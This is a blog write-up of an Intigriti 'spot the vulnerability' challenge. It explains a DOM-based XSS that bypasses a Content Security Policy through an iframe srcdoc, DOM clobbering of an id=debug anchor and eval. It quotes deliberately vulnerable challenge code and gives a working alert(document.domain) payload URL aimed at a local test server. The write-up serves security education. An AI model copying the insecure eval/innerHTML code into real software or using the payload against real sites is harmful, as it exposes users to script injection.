---
title: Can you spot the vulnerability? #16022023 — Intigriti
url: https://infosecwriteups.com/can-you-spot-the-vulnerability-16022023-intigriti-a46068e557cc?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-03-09
fetch_date: 2025-10-04T09:00:48.868501
---

# Can you spot the vulnerability? #16022023 — Intigriti

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fa46068e557cc&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcan-you-spot-the-vulnerability-16022023-intigriti-a46068e557cc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcan-you-spot-the-vulnerability-16022023-intigriti-a46068e557cc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-a46068e557cc---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-a46068e557cc---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Can you spot the vulnerability? #16022023 — Intigriti

[![Prasanth Bodepu](https://miro.medium.com/v2/resize:fill:64:64/1*sepNThSSaAqVwcGoL7G_GA.jpeg)](https://medium.com/%40prasanth.bodepu?source=post_page---byline--a46068e557cc---------------------------------------)

[Prasanth Bodepu](https://medium.com/%40prasanth.bodepu?source=post_page---byline--a46068e557cc---------------------------------------)

3 min read

·

Mar 8, 2023

--

2

Listen

Share

**Given Code Snippet:**

Press enter or click to view image in full size

![]()

### **Code review:**

**easy-eval.js**

```
if (window.debug) {
    eval(window.debug.toString()); //using eval at DOM element with id "debug"
  //only a and area tag can be used in attack as they are capable of using href attribute. toString get only that attribute
}
```

**easy-xss.js**

```
const pos = document.URL.indexOf('name=') + 5; //user input
const name = document.URL.substring(pos, document.URL.length)// just paring GET parameteres
const container = document.getElementById('container');
container.innerHTML = decodeURI(name); // no proper sanitization
```

**index.html**

```
//can't use inline script tag because it has to be src "self"
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-eval'">
<div id="container"></div>
<script src="easy-eval.js"></script>
<script src="easy-xss.js"></script>
```

**The Vulnerability**

User input is passed into the ‘**name**’ parameter straight to the ‘**innerHTML**’ so it would be rendered by browser for example inserting ‘**<h1>asdf</h1>**’ makes ‘**asdf**’ bold in browser, so ‘**HTML**’ tag is parsed correctly.

Press enter or click to view image in full size

![]()

**Exploitation**

Here, The application’s **CSP** — **Content Security Policy** is not enough to stop executing arbitrary JavaScript code.

Press enter or click to view image in full size

![]()

Using **iframe** with **srcdoc** attribute allows to fulfill **default-src: self** condition of CSP. This is because iframe with **srcdoc** is assumed **src= self**. This in addition to no proper sanitization allows to injection of JavaScript code code in the victim browser.

**Payload**

```
http://127.0.0.1:8000/?name=<iframe srcdoc="<a id=debug href=pb:alert(document.domain)><script src=easy-eval.js></script>">
```

The **srcdoc** attribute injects a tag with **id=debug** which allows to pass if statement in **easy-eval.js** then **href** attribute is set to **pb:alert(document.domain)** the first part **pb** should be nonexisting protocol. Any protocol that contains **//** would not work because in javascript **//** is a **comment**. So **http://** or f**tp://** would result in commenting on the payload and never executing it properly.

After that **easy-eval.j**s is called again to reinitialize the script and execute code in it.

**XSS**

Press enter or click to view image in full size

![]()

[Paweł Wąsik](https://twitter.com/0xSovietBeast) and I worked together to understand and identify the JS code and the vulnerability respectively. This challenge seems to be quite interesting and we were able to gain new knowledge from it.

Thanks [Richard](https://twitter.com/h43z) for providing an excellent explanation that greatly contributed to our understanding of the subject.

Refer to this thread to gain a better understanding.

> <https://twitter.com/h43z/status/1626237041787940867?s=20>

**Connect with us at** **-**

Twitter — [Prashanth](https://twitter.com/_0xPb), [Pawel](https://twitter.com/0xSovietBeast)

[Xss Attack](https://medium.com/tag/xss-attack?source=post_page-----a46068e557cc---------------------------------------)

[Xss Vulnerability](https://medium.com/tag/xss-vulnerability?source=post_page-----a46068e557cc---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----a46068e557cc---------------------------------------)

[Intigriti](https://medium.com/tag/intigriti?source=post_page-----a46068e557cc---------------------------------------)

[Information Security](https://medium.com/tag/information-security?source=post_page-----a46068e557cc---------------------------------------)

--

--

2

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--a46068e557cc---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--a46068e557cc---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--a46068e557cc---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--a46068e557cc---------------------------------------)

·[Last published 5 days ago](/how-to-find-p1-bugs-using-google-in-your-target-part-1-e37455324dc1?source=post_page---post_publication_info--a46068e557cc---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![Prasanth Bodepu](https://miro.medium.com/v2/resize:fill:96:96/1*sepNThSSaAqVwcGoL7G_GA.jpeg)](https://medium.com/%40prasanth.bodepu?source=post_page---post_author_info--a46068e557cc---------------------------------------)

[![Prasanth Bodepu](https://miro.medium.com/v2/resize:fill:128:128/1*sepNThSSaAqVwcGoL7G_GA.jpeg)](https://medium.com/%40prasanth.bodepu?source=post_page---post_author_info--a46068e557cc---------------------------------------)

[## Written by Prasanth Bodepu](https://medium.com/%40prasanth.bodepu?source=pos...